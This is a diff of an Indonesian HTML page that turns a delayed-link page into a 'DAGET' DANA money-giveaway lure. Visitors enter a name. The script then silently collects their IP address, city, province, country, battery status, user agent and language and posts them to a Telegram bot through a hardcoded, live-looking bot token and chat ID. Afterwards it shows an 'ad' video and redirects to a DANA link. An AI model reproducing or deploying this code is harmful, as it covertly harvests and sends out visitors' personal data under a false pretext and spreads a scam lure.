@@ -3,84 +3,205 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tombol Muncul Setelah 3 Detik</title>
+    <title>Kirim Info ke Telegram</title>
     <style>
-        .container {
+        body {
+            font-family: sans-serif;
+            background-color: #f4f4f4;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background-color: #f4f4f4;
+            margin: 0;
+            flex-direction: column;
         }
-        .button-wrapper {
+        .container {
             background-color: #fff;
-            padding: 20px;
+            padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
             text-align: center;
-            max-width: 600px;
+            margin-bottom: 20px;
         }
-        .button-link {
-            display: none; /* Sembunyikan tombol secara default */
-            padding: 12px 24px;
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: bold;
+        }
+        input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
             background-color: #007bff;
             color: white;
-            text-decoration: none;
+            padding: 12px 24px;
+            border: none;
             border-radius: 6px;
+            cursor: pointer;
             font-size: 18px;
             transition: background-color 0.3s ease;
         }
-        .button-link:hover {
+        button:hover {
             background-color: #0056b3;
         }
-        .description {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #555;
-        }
-        .instructions {
+        #status {
             margin-top: 20px;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            background-color: #f9f9f9;
-            text-align: left;
+            font-weight: bold;
+            color: #28a745;
         }
-        .instructions h3 {
-            font-size: 16px;
+        #status.error {
+            color: #dc3545;
+        }
+        #video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        video {
+            max-width: 80%;
+            max-height: 80%;
             margin-bottom: 10px;
         }
-        .instructions p {
-            font-size: 14px;
-            line-height: 1.6;
+        #loading-text {
+            color: white;
+            font-size: 1.2em;
+            font-style: italic;
+            margin-bottom: 5px;
         }
-        .loading-text {
-            font-size: 16px;
-            color: #777;
+        #countdown {
+            color: white;
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="button-wrapper">
-            <p class="loading-text">Menunggu sebentar...</p>
-            <a href="https://sfl.gl/YsAhU" id="visitButton" class="button-link" target="_blank">Kunjungi Situs</a>
-            <p class="description">Tombol akan muncul setelah 3 detik.</p>
-            <div class="instructions">
-                <h3>Cara Melewati teka teki</h3><p>0. klik mulai </p>
-                <p>1. Cari tombol "Open" dan langsung tekan back. dan tonton iklan 30 detik</p>
-                <p>2. tekan "next" Langsung tekan tombol "kembali" (back) </p>
-                <p>3. Cari tombol "Open" dan langsung tekan back.</p>                
-                <p>4. klik "go to link" langsung back</p>
-            </div>
-        </div>
+        <h2>DAGET 2p 50s</h2>
+        <label for="nama">Nama:</label>
+        <input type="text" id="nama" name="nama" placeholder="Masukkan nama Anda">
+        <button onclick="kirimDanTampilkanVideo()">KIRIM</button>
+        <div id="status"></div>
+    </div>
+
+    <div id="video-container" class="hidden">
+        <video id="myVideo" src="https://h.top4top.io/m_3387h96vt0.mp4"></video>
+        <p id="loading-text">Tunggu sebentar.. iklan dulu hehehe</p>
+        <p id="countdown"></p>
     </div>
 
     <script>
-        setTimeout(function() {
-            document.getElementById('visitButton').style.display = 'inline-block';
-            document.querySelector('.loading-text').style.display = 'none'; // Hilangkan teks "Menunggu sebentar..."
-        }, 3000); // 3000 milidetik = 3 detik
+        const videoContainer = document.getElementById('video-container');
+        const myVideo = document.getElementById('myVideo');
+        const statusDiv = document.getElementById("status");
+        const countdownDisplay = document.getElementById('countdown');
+        let countdownTime = 19;
+        let countdownInterval;
+
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                const status = battery.charging ? "🔌 Mengisi daya" : "⚡ Tidak mengisi daya";
+                return `Baterai: ${Math.round(battery.level * 100)}% (${status})`;
+            }
+            return "Baterai: Tidak didukung";
+        }
+
+        async function kirimKeTelegram(nama) {
+            statusDiv.innerHTML = "...";
+            statusDiv.className = "";
+
+            try {
+                const apiUrl = "https://api.db-ip.com/v2/free/self";
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+                const batteryInfo = await getBatteryInfo();
+                const userAgent = navigator.userAgent;
+                const browser = navigator.vendor || "Tidak diketahui";
+                const bahasa = navigator.language;
+                const pesan = `
+🌍 **Informasi Pengguna**
+- **Nama:** ${nama}
+- **IP:** ${data.ipAddress}
+- **Negara:** ${data.countryName}
+- **Provinsi:** ${data.stateProv}
+- **Kota:** ${data.city}
+- **${batteryInfo}**
+- **User Agent:** ${userAgent}
+- **Browser:** ${browser}
+- **Bahasa:** ${bahasa}
+                `;
+                const botToken = "7863353249:AAGeLK7vgDRaqXrdL6dLLSmogSyySPjda7k"; // API Key Telegram
+                const chatId = "-4634384561"; // Chat ID Telegram
+                const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const telegramResponse = await fetch(telegramApi, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: "Markdown" })
+                });
+
+                if (telegramResponse.ok) {
+                    statusDiv.innerHTML = "...";
+                    tampilkanVideo();
+                } else {
+                    statusDiv.innerHTML = "Gagal mengirim informasi.";
+                    statusDiv.className = "error";
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                statusDiv.innerHTML = "Terjadi kesalahan!";
+                statusDiv.className = "error";
+            }
+        }
+
+        function tampilkanVideo() {
+            videoContainer.classList.remove('hidden');
+            myVideo.play();
+            countdownTime = 19;
+            countdownDisplay.textContent = countdownTime;
+
+            countdownInterval = setInterval(() => {
+                countdownTime--;
+                countdownDisplay.textContent = countdownTime;
+                if (countdownTime <= 0) {
+                    clearInterval(countdownInterval);
+                    videoContainer.classList.add('hidden');
+                    window.location.href = "https://link.dana.id/danakaget?c=s27m3mfc7&r=cAYM8h&orderId=20250411101214120715010300166998217278273";
+                }
+            }, 1000);
+        }
+
+        function kirimDanTampilkanVideo() {
+            const nama = document.getElementById("nama").value;
+            if (!nama.trim()) {
+                statusDiv.innerHTML = "Nama tidak boleh kosong.";
+                statusDiv.className = "error";
+                return;
+            }
+            kirimKeTelegram(nama);
+        }
     </script>
 </body>
 </html>
